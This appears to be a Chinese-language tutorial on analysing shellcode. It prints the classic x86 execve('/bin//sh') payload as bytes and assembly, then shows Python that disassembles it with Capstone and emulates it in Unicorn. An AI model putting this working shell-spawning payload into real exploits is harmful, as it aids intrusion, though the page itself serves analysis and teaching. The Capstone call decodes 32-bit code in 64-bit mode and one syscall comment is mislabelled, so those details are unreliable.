# SHELLCODE

::: warning DeeLMind 提示
SHELLCODE难度比较大，需要很强的二进制基础，本质就是逆向分析。
:::

## 什么是shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为机械码，以其经常让攻击者获得shell而得名。

## 如何开发shellcode

* 自己编写
* 生成器生成

## 如何分析shellcode

* 静态分析
* 动态调试
* 符号执行
* 虚拟化执行

## shellcode分析工具

* IDA Pro
* Capstone
* Qemu
* Unicorn
* Angr

## shellcode

```
SYS_EXECV filename=/bin//sh

31 c0                   xor    eax,eax
50                      push   eax
68 2f 2f 73 68          push   0x68732f2f
68 2f 62 69 6e          push   0x6e69622f
89 e3                   mov    ebx,esp
50                      push   eax
53                      push   ebx
89 e1                   mov    ecx,esp
b0 0b                   mov    al,0xb
cd 80                   int    0x80
```

## Capstone

```python
pip install capstone

from capstone import *

CODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(CODE, 0x400010):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

## Unicorn

```python
from unicorn import *
from unicorn.x86_const import *

X86_CODE32 = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

ADDRESS = 0x1000000


def hook_code(uc, address, size, user_data):
    print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))
    tmp = uc.mem_read(address, size)
    print("*** PC = %x *** :" % (address), end="")
    for i in tmp:
        print(" %02x" % i, end="")
    print("")


def hook_block(uc, address, size, user_data):
    print(">>> Tracing basic block at 0x%x, block size = 0x%x" % (address, size))


def read_string(uc, address):
    ret = ""
    c = uc.mem_read(address, 1)[0]
    read_bytes = 1

    while c != 0x0:
        ret += chr(c)
        c = uc.mem_read(address + read_bytes, 1)[0]
        read_bytes += 1
    return ret


# callback for tracing Linux interrupt
def hook_intr(uc, intno, user_data):
    # only handle Linux syscall
    if intno != 0x80:
        print("got interrupt %x ???" % intno);
        uc.emu_stop()
        return

    eax = uc.reg_read(UC_X86_REG_EAX)
    eip = uc.reg_read(UC_X86_REG_EIP)

    if eax == 1:  # sys_exit
        print(">>> 0x%x: interrupt 0x%x, EAX = 0x%x" % (eip, intno, eax))
        uc.emu_stop()
    elif eax == 4:  # sys_write
        # ECX = buffer address
        ecx = uc.reg_read(UC_X86_REG_ECX)
        # EDX = buffer size
        edx = uc.reg_read(UC_X86_REG_EDX)
        try:
            buf = uc.mem_read(ecx, edx)
            print(">>> 0x%x: interrupt 0x%x, SYS_WRITE. buffer = 0x%x, size = %u, content = " \
                  % (eip, intno, ecx, edx), end="")
            for i in buf:
                print("%c" % i, end="")
            print("")
        except UcError as e:
            print(">>> 0x%x: interrupt 0x%x, SYS_WRITE. buffer = 0x%x, size = %u, content = <unknown>\n" \
                  % (eip, intno, ecx, edx))
    elif eax == 11:  # sys_write
        ebx = uc.reg_read(UC_X86_REG_EBX)
        filename = read_string(uc, ebx)
        print(">>> SYS_EXECV filename=%s" % filename)
    else:
        print(">>> 0x%x: interrupt 0x%x, EAX = 0x%x" % (eip, intno, eax))


def hook_syscall32(mu, user_data):
    eax = mu.reg_read(UC_X86_REG_EAX)
    print(">>> got SYSCALL with EAX = 0x%x" % (eax))
    mu.emu_stop()


def hook_syscall64(mu, user_data):
    rax = mu.reg_read(UC_X86_REG_RAX)
    rdi = mu.reg_read(UC_X86_REG_RDI)

    print(">>> got SYSCALL with RAX = %d" % (rax))

    if rax == 59:  # sys_execve
        filename = read_string(mu, rdi)
        print(">>> SYS_EXECV filename=%s" % filename)

    else:
        rip = mu.reg_read(UC_X86_REG_RIP)
        print(">>> Syscall Found at 0x%x: , RAX = 0x%x" % (rip, rax))

    mu.emu_stop()


# Test X86 32 bit
def test_i386(mode, code):
    if mode == UC_MODE_32:
        print("Emulate x86_32 code")
    elif mode == UC_MODE_64:
        print("Emulate x86_64 code")

    try:
        # Initialize emulator
        mu = Uc(UC_ARCH_X86, mode)

        # map 2MB memory for this emulation
        mu.mem_map(ADDRESS, 2 * 1024 * 1024)

        # write machine code to be emulated to memory
        mu.mem_write(ADDRESS, code)

        # initialize stack
        mu.reg_write(UC_X86_REG_ESP, ADDRESS + 0x200000)

        # tracing all basic blocks with customized callback
        mu.hook_add(UC_HOOK_BLOCK, hook_block)

        # tracing all instructions with customized callback
        mu.hook_add(UC_HOOK_CODE, hook_code)

        if mode == UC_MODE_32:
            # handle interrupt ourself
            mu.hook_add(UC_HOOK_INTR, hook_intr)
            # handle SYSCALL
            mu.hook_add(UC_HOOK_INSN, hook_syscall32, None, 1, 0, UC_X86_INS_SYSCALL)
        elif mode == UC_MODE_64:
            mu.hook_add(UC_HOOK_INSN, hook_syscall64, None, 1, 0, UC_X86_INS_SYSCALL)

        # emulate machine code in infinite time
        mu.emu_start(ADDRESS, ADDRESS + len(code))

        # now print out some registers
        print(">>> Emulation done")

    except UcError as e:
        print("ERROR: %s" % e)


if __name__ == '__main__':
    test_i386(UC_MODE_32, X86_CODE32)
```
